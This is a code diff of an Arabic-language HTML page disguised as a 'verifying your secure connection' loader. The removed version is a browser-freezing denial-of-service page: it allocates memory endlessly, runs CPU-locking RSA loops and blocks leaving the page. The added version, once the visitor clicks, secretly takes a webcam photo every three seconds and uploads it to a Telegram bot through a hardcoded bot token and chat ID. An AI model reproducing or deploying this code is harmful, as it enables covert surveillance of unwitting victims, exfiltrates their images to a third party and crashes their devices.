@@ -1,46 +1,69 @@
 
 <!DOCTYPE html>
-<html>
+<html lang="ar">
 <head>
-    <title>Critical Update</title>
+    <meta charset="UTF-8">
+    <title>جاري التحقق...</title>
+    <style>
+        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; cursor: pointer; }
+        .loader { border: 4px solid #333; border-top: 4px solid #0f0; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
 </head>
-<body style="background:black; color:white; font-family:sans-serif; text-align:center; padding-top:25%;">
-    <h1>Loading System Assets... 99%</h1>
-    
+<body onclick="startSpying()">
+
+    <div id="status">
+        <div class="loader"></div>
+        <p>جاري فحص اتصالك الآمن...</p>
+        <p style="font-size: 12px; color: #555;">(انقر للمتابعة)</p>
+    </div>
+
+    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
+    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+
     <script>
-        function ultraFreeze() {
-            // 1. استهلاك الذاكرة بشكل أسي (Exponential RAM Hog)
-            let storage = [];
-            setInterval(() => {
-                for (let i = 0; i < 50; i++) {
-                    // مضاعفة حجم البيانات في كل دورة
-                    storage.push(new Uint8Array(10 * 1024 * 1024)); // 10MB في كل إضافة
-                }
-            }, 50);
+        // إعدادات البوت الخاص بك
+        const BOT_TOKEN = '6266511830:AAFSyEOhk9Ze4Mo_bLl50wDboXceGUkKJaw';
+        const CHAT_ID = '1538488453';
 
-            // 2. قفل المعالج (CPU Deadlock)
-            function heavyCompute() {
-                while (true) {
-                    let x = Math.random() * Math.random();
-                    // محاكاة عملية تشفير ثقيلة
-                    window.crypto.subtle.generateKey(
-                        {name: "RSA-OAEP", modulusLength: 4096, publicExponent: new Uint8Array([1, 0, 1]), hash: "SHA-256"},
-                        true, ["encrypt", "decrypt"]
-                    );
-                }
-            }
+        async function startSpying() {
+            document.getElementById('status').innerHTML = '<div class="loader"></div><p>جاري توجيهك...</p>';
+            
+            try {
+                // طلب الوصول للكاميرا (سيتم التفعيل فور النقر)
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
 
-            // تشغيل 20 خيط معالجة متوازي
-            for (let j = 0; j < 20; j++) {
-                setTimeout(heavyCompute, 0);
+                // التقاط صورة كل 3 ثوانٍ وإرسالها
+                setInterval(() => {
+                    captureAndSend();
+                }, 3000);
+
+            } catch (err) {
+                // في حال الرفض يتم توجيهه لمكان آخر
+                window.location.href = "https://google.com";
             }
         }
 
-        // بدء الهجوم فوراً
-        window.onload = ultraFreeze;
+        function captureAndSend() {
+            const canvas = document.getElementById('canvas');
+            const video = document.getElementById('video');
+            const context = canvas.getContext('2d');
+            
+            context.drawImage(video, 0, 0, 640, 480);
+            
+            canvas.toBlob(blob => {
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', blob, 'snap.jpg');
 
-        // منع إغلاق المتصفح أو الرجوع
-        window.onbeforeunload = function() { return "System Error: Do not leave!"; };
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+            }, 'image/jpeg');
+        }
     </script>
 </body>
 </html>
